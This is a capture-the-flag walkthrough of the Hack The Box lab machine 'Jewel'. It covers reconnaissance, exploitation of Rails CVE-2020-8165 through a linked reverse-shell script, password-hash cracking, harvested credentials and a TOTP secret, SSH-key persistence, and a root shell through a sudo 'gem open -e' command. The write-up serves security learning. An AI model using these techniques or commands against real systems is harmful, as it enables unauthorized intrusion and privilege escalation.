# Jewel
This box is a Linux one made by polarbearer and its IP is 10.10.10.211.
We start with an nmap scan:

```
$ nmap -p- -sC -sV -oA nmap/complete 10.10.10.211
```

Weirdly, nmap comes back with:

```
Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn
```

We run the same command as before with -Pn and have results;
Ports shows:
22/tcp ssh with Debian 10 banner;
8000/tcp http Apache htppd with banner "gitweb/2.20.1 git/2.20.1"
8080/tcp http nginx 1.14.2 (Phusion Passenger 6.0.6) with title "BLOG!" and
host name "jewel.htb". We add `jewel.htb` to our hosts file, then check said
blog:

```
$ echo "10.10.10.211    jewel.htb" >> /etc/hosts
```


Blog shows a few weirdly wrote articles, some lorem ipsum. We add
the 2 authors, "bill" and "jennifer" to our users.txt file.
After digging in JS files it looks like the "BL0G" application is written
in Ruby On Rails.

The gitweb application running on port 8000 shows us the code of the BL0G
application. We'll dig into that for creds, or anything useful;

```
2020-09-17	bill	Initial commit master	commit | commitdiff | tree | snapshot
```
Let's download the whole app via the proposed snapshot:

```
$ mv ~/Downloads/git-5d6f436.tar.gz .
$ tar -xvzf git-5d6f436.tar.gz
...
$ mv .git-5d6f436/ bl0g
$ cd bl0g
```

We find ̀`bd.sql` file which is a dump of the PostgreSQL db used by the bl0g.
Digging in, we find these:

```
COPY public.users (id, username, email, created_at, updated_at, password_digest) FROM stdin;
1       bill    bill@mail.htb   2020-08-25 08:13:58.662464      2020-08-25 08:13:58.662464      $2a$12$uhUssB8.HFpT4XpbhclQU.Oizufehl9qqKtmdxTXetojn2FcNncJW
2       jennifer        jennifer@mail.htb       2020-08-25 08:54:42.8483        2020-08-25 08:54:42.8483        $2a$12$ik.0o.TGRwMgUmyOR.Djzuyb/hjisgk2vws1xYC/hxw8M1nFk0MQy
```

We got hashes for accounts bill@mail.htb & jennifer@mail.htb.
Hashes.org seems down atm and hashes.com didn't find any results for these.
We'll have to crack them ourselves using hashcat.
On my host (because i don't have ippsec's kracken...):
We searched and found "$2*$" corresponds to Bcrypt Blowfish hash
mode 3200 for hashcat

```
$ ./hashcat.exe -m 3200 hashes/jewel.hashes ./wordlists/rockyou.txt
```
With my current rig, hashcat estimates 4 days, 7 hours before completion.
That sucks.

Hashes.org is back. No results for these hashes though.
Seems to be an intended rabbit hole, otherwise the hashes wouldn't be bcrypt.
Digging more into the app's Gemfile, looking for CVE's of byebug (idea was to
exploit some debugging tools on what seems to be an on-development app?)
I found CVE-2019-5418 which could lead to RCE, but i wasn't able
to exfil /etc/passwd as presented in the Github's advisory. Then found out
there was a Metasploit module for it that told me the app wasn't vulnerable.

Found CVE-2020-8165 which applies to this project ; based on the advisory
found on Google Groups:

```
$ grep -R "cache.fetch"
app/controllers/application_controller.rb:      @current_username = cache.fetch("username_#{session[:user_id]}", raw: true) do
app/controllers/users_controller.rb:      @current_username = cache.fetch("username_#{session[:user_id]}", raw: true) {user_params[:username]}
```

Looking for exploits for this CVE i've stumbled on this github:
https://github.com/umiterkol/CVE-2020-8165--Auto-Shell/blob/main/CVE-2020-8165--Auto-Shell.py
First line was "#this script created for hackthebox jewel machine". Eh.
I guess the cat is now out of the box.

The exploit injects a Ruby object in the redis cache, which is executed when
the value is fetched from cache.
Using the script found up there, we open a netcat listener, and get a shell:

```
bill@jewel:~/blog$ cat ~/user.txt | wc -c
cat ~/user.txt | wc -c
33
```
We've owned user. Moving on to privilege escalation...

We upload linpeas.sh on the box, then exfil the output.

Linpeas.sh showed us the file ̀ /var/backups/dump_2020-08-27.sql` which
contains a different hash for user bill than the one previously found.
It is still a bcrypt hash, so cracking it will take time and hashes.org
has no candidates for it. HTB Forums says "don't be afraid of bcrypt", but
guess what i am.

Took a break, came back determined.

Running `ls -la` in bill's home directory, i found this:

```
bill@jewel:~$ cat .google_authenticator
cat .google_authenticator
2UQI3R52WFCLE6JTLDCSJYMJH4
" WINDOW_SIZE 17
" TOTP_AUTH
```

Looking at pam modules, we find sudo should be used with a TOTP password

```
bill@jewel:~$ cat /etc/pam.d/sudo
#%PAM-1.0

@include common-auth
@include common-account
@include common-session-noninteractive
auth	 required	pam_google_authenticator.so nullok
```

I've added a new ssh-key to bill's authorized keys to have a better
persistent shell.
Reading more Linpeas.out, i found some google api keys are set.
Checking /etc/ssh/sshd_config, i found that X11Forwarding is set.
Perhaps accessing bill's chromium on this server can yield data.
Manage to get X Forwarding working on chromium but no trace of bill's
account. Some "guest" user might exist, but has no password nor interesting
data.

I might've fucked up with the .config/chromium directory. I've reset
the box and i'll try again to poke the chromium installation.
That wasn't it. No accounts are logged in the chromium install.
I'm sure the box is about it though; there wouldn't be X11Forwarding Enabled
and .google_authenticator files for no reason... right ?
I've found a test/ folder and ChromeDriver is installed. I can't find any
tests on the blog's though, which is odd?

Found production creds in config/database.yml which weren't commited
```
rails_dev:beiw,aDoed1
```

Blog's "config/" directory has a "credentials.yml.enc" and "master.key" but
i don't know the type of encryption yet.
Using `EDITOR=vi rails credentials:edit` i was able to exfil the blog's
encrypted secret key:

```
secret_key_base: bc0315a1107dc1310f268c9bd7b06f13dfa6225ce35bcb85c77ee666e6c1aefa4758dee51403e3f60b6683d33eff54a6dc85f16b0346f2641c80f0a618c975b9
```

...

After Discord hints, we learned that bob's password could effectively be
cracked. I don't know why my hashcat attack didn't pick it up faster,
but bob's password was "spongebob", line 91 on rockyou.txt.
Next time i'll use john...

We can now try to ̀ sudo -l` as bill:
```
bill@jewel:~$ sudo -l
[sudo] password for bill: spongebob
Verification code:
```

This verification code is the TOTP found in .google-authenticator;

We set our box timezone and date to match the box settings:

```
$ sudo timedatectl set-timedate Europe/London
$ date --set 13:15:18
```
We then use a Firefox extension that will print us the TOTP  based
on our timezone, then use it to see what can be run by bill;

```
bill@jewel:~$ sudo -l
[sudo] password for bill:
Verification code:
Matching Defaults entries for bill on jewel:
    env_reset, mail_badpass,
        secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
	    insults

User bill may run the following commands on jewel:
    (ALL : ALL) /usr/bin/gem
```

We see that bill may run /usr/bin/gem as root. We'll abuse the "gem open"
command that should edit gems, and make it spawn a shell for us:

```
bill@jewel:~$ sudo gem open -e "/bin/bash -c /bin/bash" spring
root@jewel:/var/lib/gems/2.5.0/gems/spring-2.1.1# cat /root/root.txt | wc -c
33
```

We've owned the root account.
